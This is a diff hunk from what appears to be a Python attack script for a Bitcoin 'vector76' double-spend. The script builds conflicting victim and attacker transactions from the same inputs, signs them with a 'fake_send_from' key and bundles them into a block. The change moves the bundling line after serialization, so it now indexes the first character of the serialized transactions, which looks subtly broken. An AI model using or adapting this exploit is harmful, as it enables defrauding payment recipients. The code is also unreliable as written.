@@ -108,15 +108,14 @@ change_btc_amt = (balance - send_amount) - fee#おつり
 
 tx_victim   = [{"address": victim_address, "value": send_amount}]
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
-vector76_block = [tx_attacker[0], tx_victim[0]]
 
 tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
-tx_victim   = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
-tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, fake_send_from))
-
+tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
+tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, fake_send_from))
+vector76_block = [tx_attacker[0], tx_victim[0]]
 vector76_block = transaction_util.mktx_with_change(inputs, vector76_block, fee=fee)
-vector76_block = cryptos.serialize(transaction_util.sign(vector76_block, 0, fake_send_from))
+vector76_block = cryptos.serialize(transaction_util.signall(vector76_block, fake_send_from))
 
 print()
 print("[+] READY...")
